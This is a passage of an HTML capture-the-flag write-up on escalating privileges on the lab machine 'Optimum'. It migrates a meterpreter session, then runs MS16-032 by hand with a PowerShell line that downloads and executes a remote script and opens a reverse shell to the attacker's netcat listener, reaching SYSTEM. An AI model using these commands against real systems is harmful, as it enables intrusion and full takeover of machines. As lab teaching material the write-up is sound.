+                &nbsp;496&nbsp;&nbsp;&nbsp;392&nbsp;&nbsp;&nbsp;lsass.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;972&nbsp;&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1008&nbsp;&nbsp;724&nbsp;&nbsp;&nbsp;taskhostex.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Windows\System32\taskhostex.exe<br>
+                &nbsp;1028&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;VGAuthService.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1088&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1104&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;ManagementAgentHost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1268&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1424&nbsp;&nbsp;2540&nbsp;&nbsp;wscript.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Windows\SysWOW64\wscript.exe<br>
+                &nbsp;1520&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;dllhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1620&nbsp;&nbsp;560&nbsp;&nbsp;&nbsp;WmiPrvSE.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1656&nbsp;&nbsp;560&nbsp;&nbsp;&nbsp;WmiPrvSE.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1668&nbsp;&nbsp;488&nbsp;&nbsp;&nbsp;msdtc.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;2004&nbsp;&nbsp;240&nbsp;&nbsp;&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Windows\SysWOW64\cmd.exe<br>
+                &nbsp;2064&nbsp;&nbsp;2004&nbsp;&nbsp;conhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Windows\System32\conhost.exe<br>
+                &nbsp;2136&nbsp;&nbsp;2108&nbsp;&nbsp;explorer.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Windows\explorer.exe<br>
+                &nbsp;2512&nbsp;&nbsp;2136&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Program&nbsp;Files\VMware\VMware&nbsp;Tools\vmtoolsd.exe<br>
+                &nbsp;2540&nbsp;&nbsp;2136&nbsp;&nbsp;hfs.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Users\kostas\Desktop\hfs.exe
+            </div>
+        </div><br>
+        <br>
+        Migrate to a 64-bit process using <code>migrate &lt;pid&gt;</code><br>
+        I chose <code>conhost.exe</code>.<br>
+        By running <code>sysinfo</code>, you'll now see that your meterpreter session is 64-bit.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;migrate&nbsp;2064<br>
+                [*]&nbsp;Migrating&nbsp;from&nbsp;240&nbsp;to&nbsp;2064...<br>
+                [*]&nbsp;Migration&nbsp;completed&nbsp;successfully.<br>
+                meterpreter&nbsp;&gt;&nbsp;sysinfo<br>
+                Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;OPTIMUM<br>
+                OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows&nbsp;2012&nbsp;R2&nbsp;(Build&nbsp;9600).<br>
+                Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x64<br>
+                System&nbsp;Language&nbsp;:&nbsp;el_GR<br>
+                Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB<br>
+                Logged&nbsp;On&nbsp;Users&nbsp;:&nbsp;1<br>
+                Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x64/windows
+            </div>
+        </div><br>
+        <br>
+        Like before, <code>background</code> the meterpreter session and run the <code>local_exploit_suggester</code> module, this time searching for 64-bit exploits on the target.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;background<br>
+                [*]&nbsp;Backgrounding&nbsp;session&nbsp;1...<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;10.10.10.8&nbsp;-&nbsp;Collecting&nbsp;local&nbsp;exploits&nbsp;for&nbsp;x64/windows...<br>
+                [*]&nbsp;10.10.10.8&nbsp;-&nbsp;11&nbsp;exploit&nbsp;checks&nbsp;are&nbsp;being&nbsp;tried...<br>
+                [*]&nbsp;Post&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        But there's nothing :/<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>5) MS16-032</strong></h2><br>
+        As mentioned, exploit MS16-032 is what will give us a SYSTEM shell.<br>
+        <br>
+        If you read the exploit's description using <code>info</code>, you'll see that this vulnerability affects (amongst others) Windows Server 2012 x64, which is the architecture of OPTIMUM.<br>
+            <div class="codebox">
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/local/ms16_032_secondary_logon_handle_privesc&nbsp;<br>
+                msf5&nbsp;exploit(windows/local/ms16_032_secondary_logon_handle_privesc)&nbsp;&gt;&nbsp;info<br>
+                ...<br>
+                Available&nbsp;targets:<br>
+                &nbsp;&nbsp;Id&nbsp;&nbsp;Name<br>
+                &nbsp;&nbsp;--&nbsp;&nbsp;----<br>
+                &nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Windows&nbsp;x86<br>
+                &nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;Windows&nbsp;x64<br>
+                ...<br>
+                Description:<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;exploits&nbsp;the&nbsp;lack&nbsp;of&nbsp;sanitization&nbsp;of&nbsp;standard&nbsp;handles&nbsp;in&nbsp;<br>
+                &nbsp;&nbsp;Windows'&nbsp;Secondary&nbsp;Logon&nbsp;Service.&nbsp;The&nbsp;vulnerability&nbsp;is&nbsp;known&nbsp;to&nbsp;<br>
+                &nbsp;&nbsp;affect&nbsp;versions&nbsp;of&nbsp;Windows&nbsp;7-10&nbsp;and&nbsp;2k8-2k12&nbsp;32&nbsp;and&nbsp;64&nbsp;bit.&nbsp;This&nbsp;<br>
+                &nbsp;&nbsp;module&nbsp;will&nbsp;only&nbsp;work&nbsp;against&nbsp;those&nbsp;versions&nbsp;of&nbsp;Windows&nbsp;with&nbsp;<br>
+                &nbsp;&nbsp;Powershell&nbsp;2.0&nbsp;or&nbsp;later&nbsp;and&nbsp;systems&nbsp;with&nbsp;two&nbsp;or&nbsp;more&nbsp;CPU&nbsp;cores.
+            </div>
+        </div><br>
+        <br>
+        I couldn't get <code>ms16_032</code> to work regardless of what I tried.<br>
+        I migrated to an x64 process and ran the exploit - didn't work.<br>
+        I set the payload of the exploit to return a 64-bit meterpreter shell - didn't work.<br>
+        I set the original rejetto exploit to spawn a 64-bit shell and ran the exploit on that 64-bit shell - the exploit still didin't work<br>
+        <br>
+        I have no idea why none of this stuff worked (according to other write-ups, it's supposed to).<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>5a) MS16-032 Manual</strong></h2><br>
+        Fortunately, I could get <code>ms16-032</code> to run manually.<br>
+        <br>
+        <code>wget</code> PowerShell Empire's version of MS16-032, which provides a parameter for you to run your own commands with the exploit (instead of spawning cmd.exe like the one on exploitdb does) - <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;wget&nbsp;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1<br>
+                ...<br>
+                root@gotham:~/ctf/optimum#&nbsp;mv&nbsp;Invoke-MS16032.ps1&nbsp;ms16empire.ps1
+            </div>
+        </div><br>
+        <br>
+        And <code>wget</code> nishang's PowerShell TCP reverse shell script, which you'll use with MS16-032 to send a SYSTEM shell back to you - <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;wget&nbsp;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1<br>
+                ...<br>
+                root@gotham:~/ctf/optimum#&nbsp;mv&nbsp;Invoke-PowerShellTcp.ps1&nbsp;shell.ps1
+            </div>
+        </div><br>
+        <br>
+        Now modify PowerShell Empire's MS16-032 exploit script to execute your reverse shell.<br>
+        This reverse shell script will run with SYSTEM privileges and give you a SYSTEM shell.<br>
+        <br>
+        At the bottom script, write a line to run the <code>Invoke-MS16032</code> function and include a <code>-Command</code> parameter that will execute the reverse shell sitting on your attacking system and connect back to the IP and port your specify.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;nano&nbsp;ms16empire.ps1<br>
+                ...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$StartTokenRace.Stop()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$SafeGuard.Stop()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                }<br>
+                <br>
+                Invoke-MS16032&nbsp;-Command&nbsp;"IEX(New-Object&nbsp;Net.WebClient).downloadString('http://10.10.14.8:8000/shell.ps1');&nbsp;Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.8&nbsp;-Port&nbsp;9002"
+            </div>
+        </div><br>
+        <br>
+        Serve Empire's MS16-032 exploit and Nishang's PowerShell reverse shell from your attacking machine using <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Start a netcat listener on your attacking machine to receive the SYSTEM shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Switch over to your meterpreter session and drop into a system shell with <code>shell</code><br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;shell<br>
+                Process&nbsp;2620&nbsp;created.<br>
+                Channel&nbsp;3&nbsp;created.<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.3.9600]<br>
+                (c)&nbsp;2013&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\Users\kostas\Desktop&gt;
+            </div>
+        </div><br>
+        <br>
+        And, finally, run Empire's MS16-032 exploit with <code>powershell "IEX(New-Object)...</code><br>
+            <div class="codebox">
+                C:\Users\kostas\Desktop&gt;powershell&nbsp;"IEX(New-Object&nbsp;Net.WebClient).downloadString('http://10.10.14.8:8000/ms16empire.ps1')"<br>
+                powershell&nbsp;"IEX(New-Object&nbsp;Net.WebClient).downloadString('http://10.10.14.8:8000/ms16empire.ps1')"<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__&nbsp;__&nbsp;___&nbsp;___&nbsp;&nbsp;&nbsp;___&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___&nbsp;___&nbsp;___&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;V&nbsp;&nbsp;|&nbsp;&nbsp;_|_&nbsp;&nbsp;|&nbsp;|&nbsp;&nbsp;_|___|&nbsp;&nbsp;&nbsp;|_&nbsp;&nbsp;|_&nbsp;&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_&nbsp;&nbsp;|_|&nbsp;|_|&nbsp;.&nbsp;|___|&nbsp;|&nbsp;|_&nbsp;&nbsp;|&nbsp;&nbsp;_|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;|_|_|_|___|_____|___|&nbsp;&nbsp;&nbsp;|___|___|___|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[by&nbsp;b33f&nbsp;-&gt;&nbsp;@FuzzySec]<br>
+                <br>
+                [!]&nbsp;Holy&nbsp;handle&nbsp;leak&nbsp;Batman,&nbsp;we&nbsp;have&nbsp;a&nbsp;SYSTEM&nbsp;shell!!
+            </div>
+        </div><br>
+        <br>
+        You should see Empire's exploit and your PowerShell reverse shell being downloaded from your python server on your attacking machine<br>
+            <div class="codebox">
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.8&nbsp;-&nbsp;-&nbsp;[28/Aug/2019&nbsp;13:34:36]&nbsp;"GET&nbsp;/ms16empire.ps1&nbsp;HTTP/1.1"&nbsp;200&nbsp;-<br>
+                10.10.10.8&nbsp;-&nbsp;-&nbsp;[28/Aug/2019&nbsp;13:34:50]&nbsp;"GET&nbsp;/shell.ps1&nbsp;HTTP/1.1"&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        And a connection on your listener<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.8]&nbsp;49197
+            </div>
+        </div><br>
+        <br>
+        Wait a few seconds for the PowerShell session to spawn, and you'll have an <code>nt authority\system</code> shell!<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.8]&nbsp;49197<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;OPTIMUM$&nbsp;on&nbsp;OPTIMUM<br>
+                Copyright&nbsp;(C)&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C:\Users\kostas\Desktop&gt;whoami<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>user.txt.txt</code> and <code>root.txt</code><br>
+            <div class="codebox">
+                PS&nbsp;C:\Users\kostas\Desktop&gt;&nbsp;cat&nbsp;user.txt.txt<br>
+                d0c3940...<br>
+                PS&nbsp;C:\Users\kostas\Desktop&gt;&nbsp;cat&nbsp;C:\Users\Administrator\Desktop\root.txt<br>
+                51ed1b3...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
